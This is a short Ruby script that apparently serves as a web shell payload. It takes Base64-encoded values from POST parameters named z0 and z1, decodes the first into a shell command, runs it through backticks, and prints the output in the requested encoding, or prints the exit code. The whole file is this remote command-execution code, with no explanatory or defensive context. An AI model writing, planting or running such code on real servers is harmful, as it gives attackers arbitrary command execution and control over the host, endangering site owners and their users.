# $_POST: global variable used by the Ruby loader

require 'base64'

sz_command = Base64.decode64($_POST['z0'].to_s)
sz_encoding = Base64.decode64($_POST['z1'].to_s).strip

begin
  output = `#{sz_command}`
  n_ret_val = $?.exitstatus

  if n_ret_val == 0
    begin
      print output.encode('UTF-8', sz_encoding)
    rescue => e
      print output.force_encoding('UTF-8')
    end
  else
    print "ret=#{n_ret_val}"
  end
rescue => e
  print "ret=1"
end